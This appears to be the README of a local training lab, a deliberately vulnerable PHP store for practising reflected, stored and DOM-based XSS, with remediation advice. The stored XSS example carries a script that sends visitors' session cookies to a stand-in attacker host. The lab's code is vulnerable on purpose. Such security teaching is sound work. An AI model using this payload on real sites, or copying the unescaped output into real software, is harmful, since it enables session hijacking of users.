# XSS Lab - Gadget Store

This lab demonstrates Reflected, Stored, and DOM-based Cross-Site Scripting (XSS) in a modern PHP application.

## Lab Setup
1.  Run the PHP server: `php -S localhost:8000`
2.  Open `http://localhost:8000` in your browser.

### Credentials
- **Admin**: `admin` / `admin123`
- **User**: `victim` / `password123`

## Attack Scenarios

### 1. Reflected XSS
- **Target**: `search.php?query=`
- **Payload**: `<script>alert('Reflected XSS')</script>`
- **Scenario**: An attacker sends a link with a script in the query. The server reflects it directly into the `<h2>` tag.

### 2. Stored XSS (Persistent)
- **Target**: `product.php?id=X` (Comments Section)
- **Payload**: `<script>document.location='http://attacker.mw/steal?cookie='+document.cookie</script>`
- **Scenario**: A malicious user leaves a review. Every user who views that product will have their session cookie sent to the attacker.

### 3. DOM-based XSS (URL Parameters)
- **Target**: `product.php?id=1&promo=`
- **Payload**: `product.php?id=1&promo=<img src=x onerror=alert('DOM_XSS')>`
- **Scenario**: The script in `product.php` reads the `promo` parameter from the URL using `URLSearchParams` and injects it into the page using `innerHTML`.
- **Why it's DOM-based**: The vulnerability exists entirely in the client-side JavaScript. The server is not reflecting the payload; the browser's JavaScript engine is executing it during DOM manipulation.

## How to use the Lab (Toggle Fixes)
Each vulnerable file contains a **VULNERABLE** section and a commented-out **FIX** section. 
To test the fix:
1.  Locate the `<!-- VULNERABLE -->` block in the code.
2.  Comment out the vulnerable code.
3.  Uncomment the `<!-- FIX: ... -->` block.

## Remediation Summary
- **Reflected & Stored**: Use `htmlspecialchars($data, ENT_QUOTES, 'UTF-8')`.
- **DOM-based**: Use `textContent` instead of `innerHTML`.
- **Cookies**: Use `HttpOnly` flag.

---
